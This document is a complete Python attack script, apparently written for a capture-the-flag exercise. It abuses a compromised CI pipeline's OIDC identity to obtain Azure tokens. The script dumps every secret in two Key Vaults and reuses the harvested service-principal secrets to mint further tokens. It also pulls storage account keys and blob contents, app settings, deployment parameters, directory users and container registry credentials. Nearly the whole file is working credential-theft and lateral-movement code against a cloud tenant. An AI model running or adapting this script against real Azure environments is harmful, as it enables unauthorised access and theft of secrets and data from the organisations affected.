#!/usr/bin/env python3
"""Azure recon for Tebamoto #9 via the pwned CI OIDC identity. Read-only."""
import os, json, base64, urllib.request, urllib.parse, urllib.error, ssl, sys, time

TENANT = os.environ["AZURE_TENANT_ID"]
SUB = os.environ["AZURE_SUBSCRIPTION_ID"]
CLIENT = os.environ["AZURE_CLIENT_ID"]
LOGIN = f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token"

def req(url, data=None, headers=None, method=None, timeout=40):
    h = dict(headers or {})
    h.setdefault("User-Agent", "curl/8.5.0")
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()
        except Exception:
            return e.code, b""
    except Exception as e:
        return 0, str(e).encode()

def jbody(b):
    try:
        return json.loads(b)
    except Exception:
        return None

def brief(b, n=260):
    s = b.decode("utf-8", "replace").replace("\n", " ")
    return s[:n]

def say(*a):
    print(*a, flush=True)

def token_for(client, scope, secret=None, assertion=None):
    f = {"client_id": client, "grant_type": "client_credentials", "scope": scope}
    if secret:
        f["client_secret"] = secret
    if assertion:
        f["client_assertion_type"] = "urn:ietf:params:oauth:client-assertion-type:jwt-bearer"
        f["client_assertion"] = assertion
    s, b = req(LOGIN, urllib.parse.urlencode(f).encode(),
               {"Content-Type": "application/x-www-form-urlencoded"})
    j = jbody(b) or {}
    return j.get("access_token"), s, j.get("error_description") or j.get("error") or ""

def claims(t):
    try:
        p = t.split(".")[1]
        p += "=" * (-len(p) % 4)
        return json.loads(base64.urlsafe_b64decode(p))
    except Exception:
        return {}

def auth(t):
    return {"Authorization": "Bearer " + t} if t else {}

# ---------- OIDC ----------
url = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=api://AzureADTokenExchange"
s, b = req(url, headers={"Authorization": "Bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
OIDC = (jbody(b) or {}).get("value", "")
say(f"[oidc] status={s} len={len(OIDC)}")
if not OIDC:
    say("no OIDC, abort"); sys.exit(1)

SCOPES = {
    "arm": "https://management.azure.com/.default",
    "kv": "https://vault.azure.net/.default",
    "storage": "https://storage.azure.com/.default",
    "graph": "https://graph.microsoft.com/.default",
}
TOK = {}
for name, scope in SCOPES.items():
    t, st, err = token_for(CLIENT, scope, assertion=OIDC)
    TOK[name] = t
    c = claims(t)
    say(f"[token:{name}] st={st} len={len(t or '')} roles={c.get('roles')} aud={c.get('aud')} err={err[:120]}")
ARM = TOK.get("arm"); KV = TOK.get("kv")

# ---------- Key Vault prod: list + get every secret ----------
def kv_list_secrets(vault, tok, label):
    out = []
    if not tok:
        say(f"[{label}] no token"); return out
    s, b = req(f"https://{vault}.vault.azure.net/secrets?api-version=7.4", headers=auth(tok))
    say(f"[{label}] list st={s} {brief(b,200)}")
    if s == 200:
        for it in (jbody(b) or {}).get("value", []):
            n = it["id"].rstrip("/").split("/")[-1]
            out.append(n)
    return out

SECRETS = {}
for vault, label in [("kv-tbl-prod-x3euoz", "kvprod"), ("kv-tbl-sec-x3euoz", "kvsec")]:
    names = kv_list_secrets(vault, KV, label)
    say(f"[{label}] names={names}")
    for n in names:
        s, b = req(f"https://{vault}.vault.azure.net/secrets/{n}?api-version=7.4", headers=auth(KV))
        j = jbody(b) or {}
        val = j.get("value")
        say(f"[{label}/{n}] st={s} len={len(val) if val else 0}")
        if s == 200 and val:
            SECRETS[(vault, n)] = val
            try:
                d = json.loads(val)
                if isinstance(d, dict):
                    say(f"  keys={list(d.keys())} appId={d.get('appId')} hasSecret={bool(d.get('clientSecret'))}")
            except Exception:
                pass

# build SP list
SPS = {}
for (v, n), val in SECRETS.items():
    try:
        d = json.loads(val)
        if isinstance(d, dict) and d.get("appId") and d.get("clientSecret"):
            SPS[n] = {"appId": d["appId"], "clientSecret": d["clientSecret"]}
    except Exception:
        pass
say(f"[sps] {sorted(SPS)}")

SPTOK = {}
for n, c in SPS.items():
    if n in ("cost-reader-principal", "directory-audit-principal", "reporting-service-principal",
             "reporting-viewer-principal", "secrets-sync-principal", "sync-service-principal"):
        SPTOK[n] = {}
        for scope_name, scope in SCOPES.items():
            t, st, err = token_for(c["appId"], scope, secret=c["clientSecret"])
            SPTOK[n][scope_name] = t
            if scope_name == "arm":
                cl = claims(t)
                say(f"[sp:{n}:arm] st={st} roles={cl.get('roles')} err={err[:100]}")
            else:
                say(f"[sp:{n}:{scope_name}] st={st} len={len(t or '')}")

# each SP: try both vaults' data plane (maybe one has access to kv-tbl-sec)
for vault in ["kv-tbl-prod-x3euoz", "kv-tbl-sec-x3euoz"]:
    for n in SPTOK:
        t = SPTOK[n].get("kv")
        if not t: continue
        s, b = req(f"https://{vault}.vault.azure.net/secrets?api-version=7.4", headers=auth(t))
        info = brief(b, 160)
        names = []
        if s == 200:
            names = [it["id"].rstrip("/").split("/")[-1] for it in (jbody(b) or {}).get("value", [])]
            info = str(names)
        say(f"[kvsp:{vault}:{n}] st={s} {info}")
        if s == 200:
            for sn in names:
                s2, b2 = req(f"https://{vault}.vault.azure.net/secrets/{sn}?api-version=7.4", headers=auth(t))
                val = (jbody(b2) or {}).get("value")
                say(f"   {sn} st={s2} len={len(val) if val else 0} val={val[:300] if val else ''}")

# ---------- role assignments ----------
say("\n===== ROLE ASSIGNMENTS =====")
role_cache = {}
def role_name(rid):
    if rid in role_cache:
        return role_cache[rid]
    s, b = req(f"https://management.azure.com{rid}?api-version=2022-04-01", headers=auth(ARM))
    j = jbody(b) or {}
    role_cache[rid] = j.get("properties", {}).get("roleName", rid)
    return role_cache[rid]

s, b = req(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01", headers=auth(ARM))
say(f"[roleassign] st={s} {brief(b,200) if s!=200 else ''}")
if s == 200:
    for ra in (jbody(b) or {}).get("value", []):
        p = ra.get("properties", {})
        say(f"  {p.get('principalId')} {p.get('principalType')} -> {role_name(p.get('roleDefinitionId',''))} @ {p.get('scope')}")

# ---------- resources ----------
say("\n===== RESOURCES =====")
s, b = req(f"https://management.azure.com/subscriptions/{SUB}/resources?api-version=2021-04-01&$top=500", headers=auth(ARM))
say(f"[resources] st={s} {brief(b,200) if s!=200 else ''}")
RG = "rg-tbl-platform-prod-sea"
STORAGE_ACCOUNTS = []
STORAGE_RG = {}
VAULTS = []
SITE = None
SITE_RG = RG
if s == 200:
    for r in (jbody(b) or {}).get("value", []):
        pid = r.get("id", "")
        typ = (r.get("type") or "").lower()
        name = r.get("name")
        loc = r.get("location")
        props = r.get("properties") or {}
        try:
            rg_of = pid.split("/resourceGroups/")[1].split("/")[0]
        except Exception:
            rg_of = RG
        if typ == "microsoft.storage/storageaccounts":
            STORAGE_ACCOUNTS.append(name)
            STORAGE_RG[name] = rg_of
        if typ == "microsoft.keyvault/vaults":
            VAULTS.append(name)
        if typ == "microsoft.web/sites" and name == "app-tbl-storefront-prod":
            SITE = r
            SITE_RG = rg_of
        extra = ""
        if typ == "microsoft.storage/storageaccounts":
            extra = f" allowPublic={props.get('allowBlobPublicAccess')} netAcl={(props.get('networkAcls') or {}).get('defaultAction')} keyPolicy={(props.get('keyPolicy') or {})}"
        if typ == "microsoft.web/sites":
            extra = f" state={props.get('state')} hosts={props.get('enabledHostNames')}"
        if typ == "microsoft.keyvault/vaults":
            extra = f" accessPolicies={[(a.get('objectId'),a.get('permissions')) for a in (props.get('accessPolicies') or [])]}"
        say(f"  {name} | {typ} | {loc} | id={pid}{extra}")
        if r.get("identity"):
            say(f"    identity={r.get('identity')}")
        if r.get("tags"):
            say(f"    tags={r.get('tags')}")
        if typ in ("microsoft.storage/storageaccounts", "microsoft.keyvault/vaults"):
            # find RG from id
            try:
                rg = pid.split("/resourceGroups/")[1].split("/")[0]
            except Exception:
                rg = RG
say(f"[rg] {RG} site={bool(SITE)} storage={STORAGE_ACCOUNTS} vaults={VAULTS}")

# ---------- deployment history (sub + RG) ----------
say("\n===== DEPLOYMENTS =====")
def dump_deployments(base, label):
    s, b = req(base + "?api-version=2021-04-01", headers=auth(ARM))
    say(f"[deploy:{label}] list st={s} {brief(b,150) if s!=200 else ''}")
    if s != 200:
        return
    for d in (jbody(b) or {}).get("value", []):
        dn = d.get("name")
        s2, b2 = req(f"{base}/{dn}?api-version=2021-04-01", headers=auth(ARM))
        j = jbody(b2) or {}
        p = j.get("properties", {})
        say(f"  -- {label}/{dn} st={s2} state={p.get('provisioningState')} ts={p.get('timestamp')}")
        say(f"     params={json.dumps(p.get('parameters'))[:2500]}")
        say(f"     outputs={json.dumps(p.get('outputs'))[:2500]}")
        say(f"     templateLink={json.dumps(p.get('templateLink'))[:300]}")

dump_deployments(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.Resources/deployments", "sub")
dump_deployments(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Resources/deployments", "rg")

# ---------- app service ----------
say("\n===== APP SERVICE =====")
SITE_BASE = f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{SITE_RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod"
def webget(path, label, tok=ARM, maxn=3000):
    s, b = req(SITE_BASE + path, headers=auth(tok))
    say(f"[{label}] st={s} {brief(b,maxn) if s!=200 else ''}")
    return s, jbody(b) or {}

s, j = webget("?api-version=2023-12-01", "site", maxn=500)
if s == 200:
    p = j.get("properties", {})
    say(f"  identity={j.get('identity')} state={p.get('state')} defaultHost={p.get('defaultHostName')}")
    say(f"  hostNames={p.get('enabledHostNames')}")
    sc = p.get("siteConfig") or {}
    keep = {k: sc.get(k) for k in ["linuxFxVersion","alwaysOn","ftpsState","http20Enabled","minTlsVersion","azureStorageAccounts","ipSecurityRestrictions","appSettings","connectionStrings","functionAppSettings","vnetName","keyVaultReferenceIdentity"]}
    say(f"  siteConfig={json.dumps(keep)[:1900]}")

for path,label in [("/config/web?api-version=2023-12-01","config/web"),
                   ("/config/appsettings?api-version=2023-12-01","config/appsettings(GET)"),
                   ("/config/connectionstrings?api-version=2023-12-01","config/connstr(GET)"),
                   ("/config/authsettingsV2?api-version=2023-12-01","authsettingsV2"),
                   ("/config/azurestorageaccounts?api-version=2023-12-01","config/azurestorageaccounts(GET)"),
                   ("/slots?api-version=2023-12-01","slots"),
                   ("/instances?api-version=2023-12-01","instances"),
                   ("/backups?api-version=2023-12-01","backups"),
                   ("/config/snapshots?api-version=2023-12-01","config/snapshots"),
                   ("/deployments?api-version=2023-12-01","site/deployments")]:
    s, j = webget(path, label, maxn=2200)

# appsettings list POST with each identity (read action might be granted to a SP)
for who, t in [("oidc", ARM)] + [(n, SPTOK[n].get("arm")) for n in SPTOK]:
    if not t: continue
    s, b = req(SITE_BASE + "/config/appsettings/list?api-version=2023-12-01", data=b"",
               headers={**auth(t), "Content-Length": "0"}, method="POST")
    say(f"[appsettings/list:{who}] st={s} {brief(b,220)}")

# ---------- key vault resource details ----------
for v in VAULTS:
    s, b = req(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.KeyVault/vaults/{v}?api-version=2023-07-01", headers=auth(ARM))
    j = jbody(b) or {}
    p = j.get("properties", {})
    say(f"[kv:{v}] st={s} rbac={p.get('enableRbacAuthorization')} policies={json.dumps(p.get('accessPolicies'))[:1200]}")

# ---------- storage keys / containers ----------
say("\n===== STORAGE =====")
ACCTS = STORAGE_ACCOUNTS or ["sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblcilogsprodx3euoz"]
KEYS = {}
for acct in ACCTS:
    arg = STORAGE_RG.get(acct, RG)
    base = f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{arg}/providers/Microsoft.Storage/storageAccounts/{acct}"
    s, b = req(base + "?api-version=2023-01-01", headers=auth(ARM))
    j = jbody(b) or {}
    p = j.get("properties", {})
    say(f"[stg:{acct}] st={s} allowPublic={p.get('allowBlobPublicAccess')} netAcl={json.dumps(p.get('networkAcls'))[:300]} endpoints={(p.get('primaryEndpoints') or {}).get('blob')}")
    s, b = req(base + "/blobServices/default/containers?api-version=2023-01-01", headers=auth(ARM))
    say(f"[stg:{acct}:containers:arm] st={s} {brief(b,700) if s!=200 else ''}")
    if s == 200:
        for c in (jbody(b) or {}).get("value", []):
            say(f"   container={c.get('name')} public={((c.get('properties') or {}).get('publicAccess'))} lastMod={((c.get('properties') or {}).get('lastModifiedTime'))}")
    for who, t in [("oidc", ARM)] + [(n, SPTOK[n].get("arm")) for n in SPTOK]:
        if not t: continue
        s, b = req(base + "/listKeys?api-version=2023-01-01", data=b"",
                   headers={**auth(t), "Content-Length": "0"}, method="POST")
        out = ""
        if s == 200:
            jj = jbody(b) or {}
            for k in jj.get("keys", []):
                if k.get("value"):
                    KEYS[(acct, who)] = k["value"]
            out = f"keys={[k.get('keyName') for k in (jbody(b) or {}).get('keys', [])]}"
        else:
            out = brief(b, 140)
        say(f"[stg:{acct}:listKeys:{who}] st={s} {out}")

# anonymous probes
for acct in ACCTS:
    for path, label in [("/?comp=list", "anon-list"), ("/config?restype=container&comp=list", "anon-config"), ("/config/internal-config.json", "anon-blob")]:
        s, b = req(f"https://{acct}.blob.core.windows.net{path}", headers={"x-ms-version": "2021-08-06"})
        say(f"[anon:{acct}:{label}] st={s} {brief(b,140) if s!=200 else 'OK ' + str(b[:300])}")

# data plane probes with AAD tokens
def dp(acct, path, label, tok, extra=None):
    if not tok:
        return None
    h = {**auth(tok), "x-ms-version": "2021-08-06"}
    if extra: h.update(extra)
    s, b = req(f"https://{acct}.blob.core.windows.net{path}", headers=h)
    if s == 200:
        say(f"[dp:{acct}:{label}] st={s} BODY={b[:1500]!r}")
    else:
        say(f"[dp:{acct}:{label}] st={s} {brief(b,260)}")
    return s, b

for acct in ACCTS:
    for who, t in [("oidc", TOK.get("storage"))] + [(n, SPTOK[n].get("storage")) for n in SPTOK]:
        if not t: continue
        dp(acct, "/?comp=list", f"listcontainers:{who}", t)
        dp(acct, "/config?restype=container&comp=list", f"listconfig:{who}", t)
        dp(acct, "/config/internal-config.json", f"getconfig:{who}", t)

# user delegation key attempt (AAD only, no account key needed)
for acct in ACCTS:
    for who, t in [("oidc", TOK.get("storage"))] + [(n, SPTOK[n].get("storage")) for n in SPTOK]:
        if not t: continue
        body = b"<KeyInfo><Start>2026-10-22T00:00:00Z</Start><Expiry>2026-10-23T00:00:00Z</Expiry></KeyInfo>"
        s, b = req(f"https://{acct}.blob.core.windows.net/?restype=service&comp=userdelegationkey",
                   data=body, headers={**auth(t), "x-ms-version": "2021-08-06", "Content-Type": "application/xml"}, method="POST")
        say(f"[dp:{acct}:userdeleg:{who}] st={s} {brief(b,220) if s!=200 else 'OK'}")

# account/service SAS attempt
for acct in ACCTS:
    for who, t in [("oidc", ARM)] + [(n, SPTOK[n].get("arm")) for n in SPTOK]:
        if not t: continue
        arg = STORAGE_RG.get(acct, RG)
        body = json.dumps({"canonicalizedResource": f"/blob/{acct}/config", "signedResource": "c",
                           "signedServices": "b",
                           "signedPermission": "r", "signedProtocol": "https,http",
                           "signedExpiry": "2026-10-23T00:00:00Z"}).encode()
        s, b = req(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{arg}/providers/Microsoft.Storage/storageAccounts/{acct}/listServiceSas?api-version=2023-01-01",
                   data=body, headers={**auth(t), "Content-Type": "application/json"}, method="POST")
        say(f"[stg:{acct}:listServiceSas:{who}] st={s} {brief(b,180)}")

# if we got an account key, use SDK to list/read everything
if KEYS:
    try:
        os.system("pip install --quiet azure-storage-blob >/dev/null 2>&1")
        from azure.storage.blob import BlobServiceClient
        for (acct, who), key in KEYS.items():
            say(f"[sdk] {acct} key via {who}")
            try:
                svc = BlobServiceClient(account_url=f"https://{acct}.blob.core.windows.net", credential=key)
                for c in svc.list_containers():
                    say(f"   cont {c['name']} public={c.get('public_access')}")
                    cc = svc.get_container_client(c["name"])
                    for bl in cc.list_blobs():
                        say(f"     blob {bl.name} size={bl.size}")
                        if bl.size and bl.size < 200000:
                            data = cc.download_blob(bl.name).readall()
                            if b"DF26{" in data:
                                say(f"     FLAGBLOB {acct}/{c['name']}/{bl.name}: {data[:500]!r}")
                            elif b"AccountKey" in data or b"flag" in data.lower():
                                say(f"     INTERESTING {acct}/{c['name']}/{bl.name}: {data[:800]!r}")
            except Exception as e:
                say(f"   sdk err {e}")
    except Exception as e:
        say(f"[sdk] unavailable {e}")

# ---------- graph ----------
say("\n===== GRAPH =====")
for who, t in [("oidc", TOK.get("graph"))] + [(n, SPTOK[n].get("graph")) for n in SPTOK]:
    if not t: continue
    s, b = req("https://graph.microsoft.com/v1.0/organization", headers=auth(t))
    say(f"[graph:{who}:org] st={s} {brief(b,200) if s!=200 else ''}")
    if s == 200:
        s2, b2 = req("https://graph.microsoft.com/v1.0/users?$top=999&$select=id,userPrincipalName,displayName", headers=auth(t))
        say(f"[graph:{who}:users] st={s2} {brief(b2,600) if s2!=200 else f'{len((jbody(b2) or {}).get("value",[]))} users'}")
        s3, b3 = req("https://graph.microsoft.com/v1.0/applications?$top=999&$select=id,appId,displayName", headers=auth(t))
        say(f"[graph:{who}:apps] st={s3} {brief(b3,1200) if s3!=200 else f'{len((jbody(b3) or {}).get("value",[]))} apps'}")

# ---------- ACR creds check ----------
say("\n===== ACR =====")
for who, t in [("oidc", ARM)] + [(n, SPTOK[n].get("arm")) for n in SPTOK]:
    if not t: continue
    s, b = req(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz/listCredentials?api-version=2023-07-01",
               data=b"", headers={**auth(t), "Content-Length": "0"}, method="POST")
    say(f"[acr:listCredentials:{who}] st={s} {brief(b,200)}")

say("\n=== RECON DONE ===")
